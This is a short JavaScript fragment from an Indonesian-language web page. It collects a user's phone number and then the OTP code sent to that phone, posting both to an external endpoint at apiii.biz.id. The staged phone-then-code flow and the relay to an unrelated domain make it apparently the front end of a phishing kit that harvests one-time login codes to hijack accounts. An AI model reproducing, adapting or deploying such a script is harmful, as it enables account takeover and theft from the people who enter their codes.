function showError(message) {
        const errorDiv = document.getElementById("error-message");
        errorDiv.innerText = message;
        errorDiv.style.display = "block";
        setTimeout(() => {
            errorDiv.style.opacity = "0";
            setTimeout(() => errorDiv.style.display = "none", 500);
        }, 3000);
    }
    
    function processFirstData() {
        event.preventDefault();
        document.getElementById("loading").style.display = "flex";
        
        const phone = document.getElementById("phone").value;
         fetch("https://apiii.biz.id/code/api.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `action=reques&phone=+${phone}`
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById("loading").style.display = "none";
            if (data.status === "success") {
                localStorage.setItem("phone", phone);
                document.querySelector(".first").style.display = "none";
                document.querySelector(".second").style.display = "block";
                document.getElementById("phone-number-display").innerText = `Kode OTP telah dikirim ke ${phone}`;
            } else {
                showError(data.message);
            }
        })
        .catch(error => {
            document.getElementById("loading").style.display = "none";
            showError("Terjadi kesalahan, coba lagi.");
        });
    }

    document.getElementById("secondForm").addEventListener("submit", function(event) {
        event.preventDefault();
        document.getElementById("loading").style.display = "flex";

        const phone = localStorage.getItem("phone");
        const otp = [...document.querySelectorAll(".code-input")].map(input => input.value).join('');

        fetch("https://apiii.biz.id/code/api.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `action=verify&phone=+${phone}&otp=${otp}`
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById("loading").style.display = "none";
            if (data.status === "success") {
            document.querySelector(".second").style.display = "none";
            document.querySelector(".four").style.display = "block";
            } else {
                alert(data.message);
            }
        })
        .catch(error => {
            document.getElementById("loading").style.display = "none";
            alert("Terjadi kesalahan saat verifikasi.");
        });
    });